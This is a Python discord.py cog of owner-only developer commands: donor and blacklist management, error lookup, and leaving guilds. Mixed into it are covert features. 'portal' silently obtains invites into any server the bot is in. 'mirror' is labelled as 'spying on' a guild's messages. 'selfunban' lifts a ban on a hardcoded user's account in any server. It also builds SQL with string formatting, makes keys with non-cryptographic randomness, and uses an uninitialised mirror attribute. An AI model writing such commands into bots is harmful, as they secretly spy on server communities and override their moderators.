import discord, datetime, random, string, time, asyncpg
from discord.ext import commands
from extensions.control import Owners
from cogs.confirm import owners
from typing import Literal
from datetime import timedelta


class developer(commands.Cog):
    def __init__(self, bot: commands.AutoShardedBot):
        self.bot = bot

    @commands.group(invoke_without_command=True)
    @Owners.check_owners()
    async def donor(self, ctx: commands.Context):
        await ctx.create_pages()

    @donor.command()
    @Owners.check_owners()
    async def add(self, ctx: commands.Context, *, member: discord.User):
        result = await self.bot.db.fetchrow(
            "SELECT * FROM donor WHERE user_id = {}".format(member.id)
        )
        if result is not None:
            return await ctx.reply(f"{member} is already a donor")
        ts = int(datetime.datetime.now().timestamp())
        await self.bot.db.execute("INSERT INTO donor VALUES ($1,$2)", member.id, ts)
        return await ctx.send_success(f"{member.mention} is now a donor")

    @donor.command()
    @Owners.check_owners()
    async def remove(self, ctx: commands.Context, *, member: discord.User):
        result = await self.bot.db.fetchrow(
            "SELECT * FROM donor WHERE user_id = {}".format(member.id)
        )
        if result is None:
            return await ctx.reply(f"{member} isn't a donor")
        await self.bot.db.execute(
            "DELETE FROM donor WHERE user_id = {}".format(member.id)
        )
        return await ctx.send_success(f"{member.mention} is not a donor anymore")



    @commands.command()
    @Owners.check_owners()
    async def portal(self, ctx, id: int):
        await ctx.message.delete()
        guild = self.bot.get_guild(id)
        for c in guild.text_channels:
            if c.permissions_for(guild.me).create_instant_invite:
                invite = await c.create_invite()
                await ctx.author.send(f"{guild.name} invite link - {invite}")
                break

    @commands.command()
    @commands.is_owner()
    async def delerrors(self, ctx: commands.Context):
        await self.bot.db.execute("DELETE FROM cmderror")
        await ctx.reply("deleted all errors")

    @commands.command(aliases=["trace"])
    @Owners.check_owners()
    async def geterror(self, ctx: commands.Context, key: str):
        check = await self.bot.db.fetchrow(
            "SELECT * FROM cmderror WHERE code = $1", key
        )
        if not check:
            return await ctx.send_error(f"No error associated with the key `{key}`")
        embed = discord.Embed(
            color=self.bot.color,
            title=f"error {key}",
            description=f"```{check['error']}```",
        )
        await ctx.reply(embed=embed)

    @commands.command()
    @commands.is_owner()
    async def getkey(self, ctx: commands.Context):
        def generate_key(length):
            return "".join(
                random.choice(string.ascii_letters + string.digits)
                for _ in range(length)
            )

        await ctx.send(generate_key(36))

    @commands.command(aliases=["getinv"])
    @Owners.check_owners()
    async def getinvite(self, ctx, gid: int = None):
        guild = discord.utils.get(self.bot.guilds, id=gid)
        channel = guild.text_channels[0]
        inv = await channel.create_invite(max_age=86400)
        await ctx.send(inv)

    @commands.command()
    @Owners.check_owners()
    async def leaveg(self, ctx, guild: int):
        guild = self.bot.get_guild(int(guild))
        await guild.leave()
        await ctx.send_success(f"`{guild.name}` has been **left**")

    @commands.command()
    @Owners.check_owners()
    async def mirror(self, ctx, guild: int):
        await ctx.typing()

        if guild in self.mirror:
            del self.mirror[guild]
            await ctx.send_success(f"No longer spying on **{guild}**")
        else:
            self.mirror[guild] = ctx.channel.id
            await ctx.send_success(f"Now spying on **{guild}**")

    @commands.command()
    @Owners.check_owners()
    async def selfunban(self, ctx, guild: int):
        guild = await self.bot.fetch_guild(guild)
        member = 236931919063941121
        await guild.unban(discord.Object(id=member))
        await ctx.reply(":thumbsup:")

    @commands.command()
    @Owners.check_owners()
    async def me(
        self,
        ctx,
        amount: int | Literal["all"] = 300,
    ):
        """Clean up your messages"""

        await ctx.message.delete()

        def check(message: discord.Message):
            if message.created_at < (discord.utils.utcnow() - timedelta(days=14)):
                return False

            return message.author.id == ctx.author.id

        if amount == "all":
            await ctx.author.ban(
                delete_message_days=7,
            )
            await ctx.guild.unban(
                ctx.author,
            )
        else:
            await ctx.channel.purge(
                limit=amount,
                check=check,
                before=ctx.message,
                bulk=True,
            )

    @commands.group(
        name="blacklist",
        usage="(subcommand) <args>",
        example="add (user) <note>",
        aliases=["bl"],
        invoke_without_command=True,
    )
    @Owners.check_owners()
    async def blacklist(self, ctx):
        await ctx.send_help()

    @blacklist.command(
        name="add",
        usage="(user) <note>",
        example="Claqz Freak",
        aliases=["create"],
    )
    @Owners.check_owners()
    async def blacklist_add(
        self, ctx, user: discord.Member | discord.User, *, note: str = "No reason given"
    ):
        try:
            await self.bot.db.execute(
                "INSERT INTO blacklist (user_id, note) VALUES ($1, $2)",
                user.id,
                note,
            )
            await ctx.reply(f"Added **{user}** to the blacklist")
        except asyncpg.UniqueViolationError:
            await ctx.reply(f"**{user}** has already been blacklisted")
        except Exception as e:
            print(f"Error while adding user {user.id} to blacklist: {e}")
            await ctx.reply(
                f"An error occurred while adding **{user}** to the blacklist"
            )

    @blacklist.command(
        name="remove",
        usage="(user)",
        example="Claqz",
        aliases=["delete", "del", "rm"],
    )
    @Owners.check_owners()
    async def blacklist_remove(self, ctx, *, user: discord.Member | discord.User):
        try:
            await self.bot.db.execute(
                "DELETE FROM blacklist WHERE user_id = $1",
                user.id,
            )
            await ctx.reply(f"Removed **{user}** from the blacklist")
        except Exception as e:
            print(f"Error while removing user {user.id} from blacklist: {e}")
            await ctx.reply(
                f"An error occurred while removing **{user}** from the blacklist"
            )

    @blacklist.command(
        name="check",
        usage="(user)",
        example="Claqz",
        aliases=["note"],
    )
    @Owners.check_owners()
    async def blacklist_check(self, ctx, *, user: discord.Member | discord.User):
        try:
            note = await self.bot.db.fetchval(
                "SELECT note FROM blacklist WHERE user_id = $1",
                user.id,
            )
            if not note:
                await ctx.reply(f"**{user}** isn't blacklisted")
            else:
                await ctx.reply(f"**{user}** is blacklisted for **{note}**")
        except Exception as e:
            print(f"Error while checking user {user.id} in blacklist: {e}")
            await ctx.reply(
                f"An error occurred while checking **{user}** in the blacklist"
            )


async def setup(bot) -> None:
    await bot.add_cog(developer(bot))
